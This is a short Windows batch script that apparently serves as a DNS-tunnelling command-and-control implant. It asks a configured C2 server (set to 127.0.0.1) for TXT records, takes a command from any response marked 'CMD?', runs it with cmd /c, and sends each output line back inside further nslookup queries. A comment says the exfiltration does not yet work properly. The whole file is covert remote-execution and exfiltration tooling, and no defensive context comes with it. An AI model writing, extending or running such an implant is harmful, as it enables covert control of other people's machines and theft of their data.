@echo off
setlocal enabledelayedexpansion

:: config
set cnc=127.0.0.1

:: get
for /f "delims=? tokens=2" %%a in ('nslookup "-q=TXT" "example.com" "%cnc%" 2^> nul ^| find "CMD?"') do (
    set command=%%a
)

if [!command!] == [] goto :eof

:: decode
set command=!command:~0,-1!

:: run and exfil. This doesn't yet work properly.
for /F "delims=" %%i in ('cmd /c "!command!"') DO (
    set "line=%%i"
    set line=!line: =%%!
    nslookup "-q=TXT" "A?!line!" "!cnc!" 2> nul > nul
)
